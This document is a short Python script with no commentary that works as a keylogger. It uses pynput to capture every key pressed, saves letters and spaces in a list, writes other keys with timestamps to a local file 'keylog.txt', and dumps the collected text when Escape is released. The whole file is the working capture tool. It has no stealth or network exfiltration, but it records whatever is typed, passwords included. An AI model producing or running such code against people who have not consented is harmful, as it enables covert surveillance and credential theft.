from pynput import keyboard
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

keys_pressed = []

def on_press(key):
    try:
        if key.char.isalpha(): 
            keys_pressed.append(key.char) 
        else:
            logging.info(f"! {key.char}")  
    except AttributeError:
        if key == keyboard.Key.space:
            keys_pressed.append(" ") 
        else:
            logging.info(f"! {key}")  

def on_release(key):
    if key == keyboard.Key.esc:
        logging.info(" ".join(keys_pressed))
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()